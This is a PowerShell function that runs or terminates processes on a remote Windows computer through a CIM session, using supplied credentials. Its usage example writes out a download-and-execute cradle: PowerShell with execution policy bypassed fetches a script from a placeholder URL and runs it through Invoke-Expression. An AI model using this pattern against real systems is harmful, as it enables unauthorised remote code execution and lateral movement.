Function CIMSessionExecution {
    <#
    .SYNOPSIS
    Execute commands/scripts via CIM session.
    
    .DESCRIPTION
    This function for example can be used to execute script, also provides output from remote computer.
    
    .PARAMETER User
    Mandatory - user of the target machine.    
    .PARAMETER Pass
    Mandatory - password on target machine. 
    .PARAMETER Command
    Mandatory - execute or terminate your command on a remote computer.  
    .PARAMETER Computer
    Mandatory - hostname of remote computer, you can import list via pipeline.
    .PARAMETER Protocol
    Mandatory - choose desired protocol to be used in execution, default is set to Dcom.   
    .PARAMETER Class
    NotMandatory - choose class, default present, others unimplemented atm.
    .PARAMETER Method
    NotMandatory - choose method of a class, for now you can create or terminate a process.
  
    .EXAMPLE
    CIMSessionExecution -User "your_user" -Pass "your_pass" -Computer "your_computer_hostname" -Command 'powershell -executionpolicy bypass -Command "Invoke-WebRequest https://path_to_your_script/your_script.ps1 -UserAgent "your_secret" -UseBasicParsing -OutFile $env:TEMP\Script.ps1; & Invoke-Expression $env:TEMP\Script.ps1'
    
    .NOTES
    https://docs.microsoft.com/en-us/windows/win32/wmisdk/cimclas
    https://www.activexperts.com/admin/scripts/wmi/
    https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/terminate-method-in-class-win32-process
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$User,

        [Parameter(Mandatory = $true)]
        [string]$Pass,

        [Parameter(Mandatory = $true)]
        [string]$Command,

        [Parameter(Mandatory = $true)]
        [string]$Computer,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Default', 'Dcom', 'Wsman')]
        [string]$Protocol = 'Dcom',

        [Parameter(Mandatory = $false)]
        [ValidateSet('Process', 'Property')]
        [string]$Class = 'Process',

        [Parameter(Mandatory = $false)]
        [ValidateSet('Create', 'Terminate')]
        [string]$Method = 'Create'
    )
    $Password = ConvertTo-SecureString -AsPlainText $Pass -Force
    $SecureCredentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password
    $SessionArgs = @{
        ComputerName  = $Computer
        Credential    = Get-Credential -Credential $SecureCredentials
        SessionOption = New-CimSessionOption -Protocol $Protocol

    }
    $MethodArgs = @{
        ClassName  = "Win32_$Class" 
        MethodName = $Method
        CimSession = New-CimSession @SessionArgs
        Arguments  = @{
            CommandLine = $Command
        }
    }
    Invoke-CimMethod @MethodArgs
}